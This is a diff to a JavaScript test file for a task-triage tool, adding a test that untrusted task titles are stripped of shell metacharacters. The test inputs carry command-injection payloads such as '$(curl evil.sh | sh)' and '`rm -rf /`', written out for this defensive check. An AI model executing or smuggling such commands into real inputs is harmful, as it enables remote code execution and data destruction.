@@ -106,17 +106,35 @@ test('the sprint target ids are never reported as unrouted or stranded', () => {
     assert.equal(control.total, 2, 'non-vacuity: without targetIds both are listed');
 });
 
+test('untrusted text is neutralised: no $, backtick or backslash survives into any emitted line', () => {
+    const t = computeOwedTriage({
+        scopeBeads: [task('T-1', { title: 'Run `whoami` then $(curl evil.sh | sh) \\' })],
+        rejectedNewTasks: [{
+            cycle: 1,
+            reason: 'title fails safe-character allowlist /^[A-Za-z]+$/ (or is empty): "Fix $(curl evil.sh | sh)"',
+            raw: { title: 'Fix auth $(curl evil.sh | sh) `rm -rf /` backslash\\' },
+        }],
+    });
+    const lines = formatOwedTriageLines(t);
+    assert.ok(lines.length > 0);
+    for (const l of lines) {
+        assert.ok(!l.includes('$') && !l.includes('`') && !l.includes('\\'), `unsafe character survived: ${l}`);
+    }
+    assert.match(t.rejectedFindings[0].reason, /^title failed the safe-character check/);
+    assert.ok(t.rejectedFindings[0].title.includes('Fix auth'), 'the readable part of the title is kept');
+});
+
 describe('rejectedFindings', () => {
     test('each rejectedNewTasks entry is listed with its title, reason and cycle', () => {
         const t = computeOwedTriage({
             rejectedNewTasks: [
                 { cycle: 2, reason: 'priority out of range', raw: { title: 'Fix the flaky\nretry' } },
-                { cycle: 'final', reason: 'missing title', raw: { description: 'x' } },
+                { cycle: 'final', reason: 'unexpected', raw: { description: 'x' } },
             ],
         });
         assert.equal(t.rejectedFindings.length, 2);
         assert.equal(t.rejectedFindings[0].title, 'Fix the flaky retry');
-        assert.equal(t.rejectedFindings[0].reason, 'priority out of range');
+        assert.match(t.rejectedFindings[0].reason, /^invalid priority; verbatim finding is in the parent bead notes$/);
         assert.equal(t.rejectedFindings[0].cycle, 2);
         assert.equal(t.rejectedFindings[1].title, '(untitled finding)');
         assert.equal(t.total, 2);
